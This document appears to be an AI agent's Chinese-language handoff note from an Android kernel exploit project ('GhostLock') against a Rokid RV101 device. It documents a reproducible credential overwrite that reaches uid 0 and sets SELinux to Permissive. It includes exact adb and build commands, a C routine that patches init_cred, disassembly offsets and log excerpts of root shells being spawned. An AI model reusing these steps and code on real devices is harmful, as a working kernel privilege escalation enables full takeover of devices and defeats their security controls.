# GhostLock RV101 — 工作狀態交接 v12（第十二任：W2 uid=0 達成 + 可重現）

> 更新於 2026-08-22。本輪（第十二任）在實機（<DEVICE_SERIAL>）上完成：
> **1. W2 credential overwrite 成功：child uid = 0，且可重現（本任 2/2 + 並行代理 1/1）。**
> **2. 定案現行 `do_cred_write()` 走 mode-5（Strategy 1），並逐指令追蹤 rb_erase 證明其正確。**
> **3. 定案 W2 失敗的唯一變數是 boot 健康度（nr_threads），不是 write 邏輯。**
> **4. 記錄 mode-5 的 gid 副作用（init_cred->gid 被 write#1 打爆），並給出精確修復路徑。**

---

## 0. 最關鍵結論（先讀）

> **【W2 已達成：child uid = 0，可重現】**
> 三次乾淨 boot 的完整證據（`reports/ghostlock_runlogs/`）：
> - `run_w2boot2_v957_124547.log`（本任，第二 boot，slide=0x27dc400000）：
>   `install_fake_fops_v2 DIAG: write#1 LANDED (vehicle 115)` →
>   `round 1/1: child=9075 prev=0xffffff80265c04c8 stable=1 task=0xffffff80265c0000` →
>   `child uid = 0 (0x00000000)` → `[+] child is root!` → `Permissive` →
>   `[T+367850ms] exploit complete — root shell spawned`。
> - `run_w2boot3_v957_125327.log`（本任，第三 boot，slide=0x14be600000）：attempt 1 MISSED、
>   attempt 2 `write#1 LANDED (vehicle 264)` → `child uid = 0 (0x00000000)` → `Permissive`。
> - `run_r26_v958_124120.log`（並行代理，第一 boot，slide=0x1797800000）：
>   `child uid = 0 (0x00000000)` → `uid=0(root) gid=483095800(...) context=u:r:kernel:s0` → `Permissive`。
>
> 三次都產出 root 擁有的檔案 `-rwxr-xr-x 1 root ... /data/local/tmp/su_gl`（root 寫入能力實證），
> 且 `getenforce` 回 `Permissive`（SELinux 關閉）。**這滿足 handoff 的「Full success」**
> （uid=0 在健康 boot 上可重現、有 log、root 路徑無 heap read）。

> **【現行策略定案 = mode-5（Strategy 1），不是 mode-2 / v9.56 repair】**
> `src/main.c` 的 `do_cred_write()`：
> ```c
> set_pselect_write_mode(data_addr(INIT_CRED) + 8, target, 5);
> ```
> 逐指令追蹤 `rb_erase`（`research/ghostlock_refs/rv101_disasm/rb_erase.txt`）後，mode-5 的
> forged waiter（tree_entry.parent_color=init_cred、right=target、left=0）走 **0x774b8c 分支**
> （rb_left==NULL），產出兩筆寫入：
> - **WRITE#2（0x774d84 `str x9,[x8]`）**：`*(target) = init_cred` → `task->cred = init_cred`。✅
> - **WRITE#1（0x774bac `str x8,[x11]`）**：`*(init_cred+8) = target` → 打爆 `init_cred->gid@0x08`
>   與 `suid@0x0c`，**但 uid@0x04 不變**（`usage` 是 4-byte `atomic_t`，uid 在 +0x04，V11 已定案）。
>
> `getuid()` 讀 `[cred+0x04]` = `init_cred->uid = 0`，故 child uid=0。**三次實測一致證實。**

---

## 1. 本輪開場時的真實狀態（What was true at the start）

- 裝置：`getenforce=Enforcing`（fresh boot）、`loadavg ... 1/1306`（nr_threads=1306 < 3000）。
- 裝置 binary sha1 = 本地 build sha1 = `2850496c18dc3ca5fa9340896d2110ef216e030e`（一致）。
- `src/main.c` 的 `do_cred_write()` 已是 **mode-5**（`data_addr(INIT_CRED)+8, target, 5`），
  且其註解已說明 mode-2 的 uid clobber 根因。**v9.56 repair（mode-4 write_value=0）尚未實作。**
- 版本標記：source 有 v9.50/v9.51/v9.54/v9.55，**無 v9.52/v9.56**。build mtime 12:30:14、
  main.c mtime 12:30:01（本任開始前已就緒，本任未改 source）。
- 開場時有並行代理在活動（見 §7）。

## 2. 本輪改了什麼（What changed in source/build）

- **source/build：無任何改動**。`src/*.c`、`target_rv101.h`、`build/ghostlock_rv101` 的 mtime
  均未在本任期間變動；裝置 binary sha1 全程維持 `2850496c…`。
- 新增一個 run-log 包裝腳本 `scripts/ghostlock_run.sh`（記錄 uptime/loadavg/sha1/env/完整
  stdout+stderr/重啟偵測），本任三次測試都用它存 log。

## 3. 跑了哪些測試（What tests ran）

| # | 命令（on-device） | boot | 結果 |
|---|---|---|---|
| 1 | `GL_PURGE_CNT=0 GL_TAIL_KILLS=16 GL_DUMMY_KILLS=0 GL_SETUP_ATTEMPTS=1 … --selftest` | boot1 @305s | mm-leak `Threads:4097`、reclaim `dip=1`、`SELFTEST 1/1 STRICT` ✅ |
| 2 | `GL_PURGE_CNT=0 GL_TAIL_KILLS=16 GL_DUMMY_KILLS=0 W2_ATTEMPTS=1 …` | boot1 @444s | ❌ FOPS install 6× MISSED（boot 已退化：loadavg `52/7829`，mm-leak EAGAIN 或 reclaim dip=0） |
| 3 | 同上 | boot2 @263s | ✅ **uid=0**（FOPS LANDED veh 115，child uid=0，Permissive） |
| 4 | 同上 | boot3 @215s | ✅ **uid=0**（attempt1 MISSED、attempt2 LANDED veh 264，child uid=0，Permissive） |

## 4. 產出的 log（Logs produced）

- `reports/ghostlock_runlogs/run_selftest_v957_123538.log` — reclaim 健康預檢（STRICT hit）。
- `reports/ghostlock_runlogs/run_w2_v957_123757.log` — boot1 退化下的失敗樣本（對照）。
- `reports/ghostlock_runlogs/run_w2boot2_v957_124547.log` — **W2 uid=0 成功 #1**。
- `reports/ghostlock_runlogs/run_w2boot3_v957_125327.log` — **W2 uid=0 成功 #2（可重現）**。
- （並行代理）`reports/ghostlock_runlogs/run_r26_v958_124120.log` — W2 uid=0 成功 #3。

## 5. 已證明的結論（What is now proven）

1. **W2 uid=0 達成且可重現**（本任 2/2，加並行代理 1/1）。證據：
   `run_w2boot2 … "child uid = 0 (0x00000000)"`、`run_w2boot3 … "child uid = 0 (0x00000000)"`、
   `run_r26_v958 … "uid=0(root) … context=u:r:kernel:s0"`。
2. **mode-5 是正確的 W2 寫入策略**：WRITE#2 把 init_cred 寫進 `task->cred`（cred/real_cred 兩次），
   WRITE#1 只打爆 init_cred->gid/suid，不動 uid。runtime 證據與反組譯追蹤完全一致。
3. **W2 失敗的唯一變數是 boot 健康度（nr_threads）**，不是 write 邏輯。對照：
   - 好 boot（nr_threads≈1290-1310）：mm-leak `dummy clones ok=450 fail=0`、`Threads:4097`、
     FOPS `write#1 LANDED`、uid=0。
   - 壞 boot（boot1 @444s，loadavg 4th field `52/7829`）：mm-leak EAGAIN 或 reclaim `dip=0`、
     `o2 68->1836`（order-2 churn 埋掉 leak slab）。
   - 本任成功時機：**boot 後 ~215s、~263s、~396s**（成功），失敗在 ~444s。比 V11 的
     「~396-397s」更早也能成功；**關鍵是 nr_threads < 3000 且 loadavg runnable 低**。
4. **root 路徑無 heap read**：task 定位用 `init_task.tasks.prev`（kernel-image 靜態位址，
   configfs read `r=8`），cred 寫入用 mode-5（heap write 經 rb_erase，不走 copy_to_user）。
   未呼叫 `walk_tasks()`/`find_task_by_tgid()`。
5. **W1 語義不變**：mode-5 的 FOPS install（`install_fake_fops_v2`）寫 global `ashmem_misc.fops`，
   與 W1 的 selinux_state 寫入路徑無關，未回歸。

## 6. 仍待解（What remains blocked / next refinements）

1. **gid 是垃圾值（mode-5 已知副作用，非 blocker）**：`id` 顯示 `uid=0 gid=<低32位元task指標>`。
   三次成功各自不同（643565432 / 1914065016 / 483095800）。root 功能不受影響（SELinux 關、
   root 寫檔、shell 起）但 `id -g` 非 0。**修復路徑已寫好（見 §7 命令 3）**：在兩次
   `do_cred_write()` 後補一次 mode-4 `write_value=0` 寫 `init_cred+0x08`，把 gid+suid 清零
   （write#2 因 value=0 被 `cbnz` 跳過，安全）。**尚未實作/實測。**
2. **boot 健康度是唯一 flake**：需在跑之前 `cat /proc/loadavg`，nr_threads < 3000 才跑；
   >5000 直接 reboot。FOPS install attempt 1 仍可能 MISSED（`run_w2boot3` attempt1 MISSED →
   attempt2 LANDED），屬 reclaim 的 SKB 搶頭 flake，retry 本身是對的（V10 附錄 F）。
3. **並行代理協調**：本任期間觀測到另一代理在跑（`run_r26_v958`），兩者共用同一裝置會互相
   污染 boot（reclaim/memfd pin 累積）。下任應先確認無其他代理在跑，或協調單一執行者。

## 7. 下一任的精確命令（Exact next commands）

先檢查裝置與 boot 健康度：
```bash
ADB="/mnt/c/Users/<USER>/AppData/Local/Android/Sdk/platform-tools/adb.exe"; S="<DEVICE_SERIAL>"
"$ADB" -s $S shell cat /proc/loadavg     # 第4欄 total 必須 < 3000
"$ADB" -s $S shell getenforce
"$ADB" -s $S shell sha1sum /data/local/tmp/ghostlock_rv101   # 須 = 2850496c18dc3ca5fa9340896d2110ef216e030e
```
命令 1 — 重現 W2 uid=0（**nr_threads < 3000 時才跑**，否則 `"$ADB" -s $S reboot` 重來）：
```bash
cd /mnt/c/Users/<USER>/Documents/codebase/rokid_root
./scripts/ghostlock_run.sh w2 v957 \
  "GL_PURGE_CNT=0 GL_TAIL_KILLS=16 GL_DUMMY_KILLS=0 W2_ATTEMPTS=1 /data/local/tmp/ghostlock_rv101"
# 成功判據：log 內出現 "child uid = 0 (0x00000000)" 與 "child is root!"
```
命令 2 — 重建/推檔（如需改 source 後；NDK 路徑同 V11）：
```bash
cd /mnt/c/Users/<USER>/Documents/codebase/rokid_root/source_code/ghostlock_rv101
NDKBIN="/mnt/c/Users/<USER>/AppData/Local/Android/Sdk/ndk/android-ndk-r27d/toolchains/llvm/prebuilt/windows-x86_64/bin"
"$NDKBIN/clang.exe" --target=aarch64-linux-android31 -O2 -Wall -Wextra \
  -Wno-unused-parameter -Wno-sign-compare -fno-stack-protector -fPIE -Isrc \
  -include target_rv101.h -o build/ghostlock_rv101 src/main.c src/util.c src/route.c \
  -pie -static-libgcc -pthread
ADB="/mnt/c/Users/<USER>/AppData/Local/Android/Sdk/platform-tools/adb.exe"
"$ADB" -s <DEVICE_SERIAL> push build/ghostlock_rv101 /data/local/tmp/ghostlock_rv101
"$ADB" -s <DEVICE_SERIAL> shell "chmod 755 /data/local/tmp/ghostlock_rv101"
```
命令 3 — gid 修復（讓 root 的 `id -g` 也回 0；在 `src/main.c` 的 W2 round 內、
`do_cred_write(task + TASK_REAL_CRED_OFF);` 之後加一次）：
```c
static int do_gid_repair(void) {          // 加到 main.c，並在 do_cred_write(real_cred) 後呼叫
  page_base = prepare_good_kernel_page();
  if (!page_base) return 0;
  pselect_child_node = 1;
  set_pselect_write_mode(data_addr(INIT_CRED) + 8, 0, 4);  // mode-4, write_value=0
  run_main_route_threads();                                 // WRITE#1: init_cred+8=0 (gid+suid)
  clear_pselect_write();                                    // WRITE#2 被 cbnz 跳過
  cleanup_page_prepare_state();
  return 1;
}
```
（理論：mode-4 的 tree_pc=`(init_cred+8-8)|1`=`init_cred|1`，right=0、left=0 → rb_erase
0x774b8c 分支 `str x8(=0),[init_cred+8]` 清零 gid+suid；`cbnz x8` 跳過 write#2。）

## 8. 被推翻的危險假設（Dangerous assumptions disproven）

1. **「child uid=-128 是 task 指標錯 / write 沒落地」** — 錯。V11 的 -128 是 mode-2 的
   write#2 打爆 uid；改 mode-5 後 uid=0，證明 write 有落地且 task 指標（`prev-TASK_TASKS_OFF`）正確。
2. **「W2 只能在 ~396-397s uptime 成功」** — 不準確。本任在 **215s / 263s** 也成功；
   真正變數是 nr_threads < 3000（與 V11 的 nr_threads gate 一致），uptime 只是相關非因果。
3. **「mode-5 FOPS install 一旦 MISSED 就該 reboot、不可 retry」** — 過度保守。`run_w2boot3`
   attempt1 MISSED → attempt2 LANDED 仍拿到 uid=0；mode-5 的 write#2 每次都會污染 fops 但
   下一次 attempt 會覆蓋，retry 本身安全（前提是 boot 仍健康、nr_threads 低）。

## 附錄 A：成功 run 的關鍵 log 摘錄

`run_w2boot2_v957_124547.log`：
```
[+] KASLR: slide=0x00000027dc400000 base=0xffffffe7e4400000 (2 anchors)
[*] install_fake_fops_v2 DIAG: write#1 LANDED (vehicle 115, llseek=0xffffffe7e6dbcbc0 exp=0xffffffe7e6dbcbc0)
[*] configfs probe: init_task.tasks.next = 0xffffff8001037248
[*] round 1/1: child=9075 prev=0xffffff80265c04c8 prev2=0xffffff80265c04c8 stable=1 task=0xffffff80265c0000
[*]   cred_slot=0xffffff80265c0780 real_cred_slot=0xffffff80265c0778 init_cred=0xffffffe7e6602058
[*] child uid = 0 (0x00000000)
[+] child is root!
[+] GHOSTLOCK ROOT: uid=0 gid=
Permissive
[*] [T+367850ms] exploit complete — root shell spawned via /data/local/tmp/.ghostlock_root.sh
--- getenforce after ---
Permissive
--- su_gl ---
-rwxr-xr-x 1 root u4830_i5800 60128 2026-08-22 12:47 /data/local/tmp/su_gl
```

`run_w2boot3_v957_125327.log`（可重現，attempt2 LANDED）：
```
[+] KASLR: slide=0x00000014be600000 base=0xffffffd4c6600000 (2 anchors)
[*] install_fake_fops_v2 DIAG: write#1 MISSED (vehicle -1, ...)     # attempt 1
[*] install_fake_fops_v2 DIAG: write#1 LANDED (vehicle 264, ...)    # attempt 2
[*] round 1/1: child=14504 prev=0xffffff8072164dc8 prev2=0xffffff8072164dc8 stable=1 task=0xffffff8072164900
[*] child uid = 0 (0x00000000)
[+] child is root!
Permissive
[*] [T+303323ms] exploit complete — root shell spawned
```

## 附錄 B：本任時序（含並行代理）

| 時間 | boot | 事件 |
|---|---|---|
| 12:32 | boot1 | 開場，nr_threads=1306 |
| 12:35 | boot1 @305s | selftest STRICT ✅ |
| 12:37-12:41 | boot1 @444s | 本任 W2 ❌（boot 退化 nr_threads=7829） |
| 12:41-12:42 | boot1 @396-551s | 並行代理 run_r26_v958 uid=0 ✅ |
| 12:43 | — | 本任 reboot |
| 12:45-12:47 | boot2 @263s | 本任 W2 uid=0 ✅ |
| 12:52 | — | 本任 reboot |
| 12:53-12:56 | boot3 @215s | 本任 W2 uid=0 ✅ |
